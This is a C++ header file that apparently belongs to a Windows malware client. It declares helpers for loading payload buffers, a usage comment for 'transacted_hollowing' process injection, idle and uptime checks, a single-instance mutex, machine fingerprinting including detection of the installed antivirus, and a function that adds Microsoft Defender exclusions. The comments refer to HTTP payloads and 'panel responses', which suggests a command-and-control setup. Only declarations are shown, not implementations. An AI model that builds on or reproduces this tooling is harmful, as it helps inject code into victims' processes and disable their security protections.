#pragma once

#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <locale>
#include <unordered_map>
#include <codecvt>

BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size);

// Payload buffers are handed to
// free_buffer(), which uses VirtualFree(). Always allocate them with
// allocate_buffer() so the pair actually releases the memory.
BYTE* allocate_buffer(size_t size);
void free_buffer(BYTE* buffer);

std::string buildCommandFromTemplate(
    const std::string& template_str,
    const std::unordered_map<std::string, std::string>& replacements
);

bool IsDeviceIdle(int minutes);

LPWSTR StringToLPWSTR(const std::string& str);

// Owns the buffer produced by StringToLPWSTR so call sites cannot leak it:
//   transacted_hollowing(target, payload, size, ScopedLPWSTR(args));
class ScopedLPWSTR {
public:
    explicit ScopedLPWSTR(const std::string& str) : ptr_(StringToLPWSTR(str)) {}
    ~ScopedLPWSTR() { delete[] ptr_; }

    ScopedLPWSTR(const ScopedLPWSTR&) = delete;
    ScopedLPWSTR& operator=(const ScopedLPWSTR&) = delete;

    LPWSTR get() const { return ptr_; }
    operator LPWSTR() const { return ptr_; }

private:
    LPWSTR ptr_;
};

// --- Encoding helpers -------------------------------------------------------
// The client only ever speaks UTF-8 internally (HTTP payloads, nlohmann::json,
// panel responses). Any text coming from a Win32 *W API / BSTR / WMI is UTF-16
// and must be converted with WideCharToMultiByte(CP_UTF8, ...). Never use
// wcstombs_s/wcstombs or the *A registry APIs for data that leaves the process:
// they emit ANSI code page bytes that are not valid UTF-8 and make json dumps
// throw. All helpers below return valid UTF-8 strings.
std::wstring Utf8ToWide(const std::string& str);
std::string WideToUTF8(const wchar_t* wstr, int len = -1);
std::string WideToUTF8(const std::wstring& wstr);
std::string AnsiToUTF8(const char* str, int len = -1);
bool IsValidUTF8(const std::string& str);
std::string EnsureValidUTF8(const std::string& str);
std::string TrimWhitespace(const std::string& str);

std::string GetWindowsUsername();

int GetSystemUptimeMinutes();

wchar_t* get_file_name(wchar_t *full_path);

bool IsAnotherInstanceRunning(const char* mutexName);

wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const size_t out_buf_size);
bool AreProcessesRunning(const std::vector<std::string>& processNames);

// System info functions
std::string GetCPUName();
std::string GetGPUName();
std::string GetComputerHash();
std::string GetAntivirusName();

// Admin and security functions
bool IsRunningAsAdmin();
bool AddDefenderExclusion(const std::string& path);

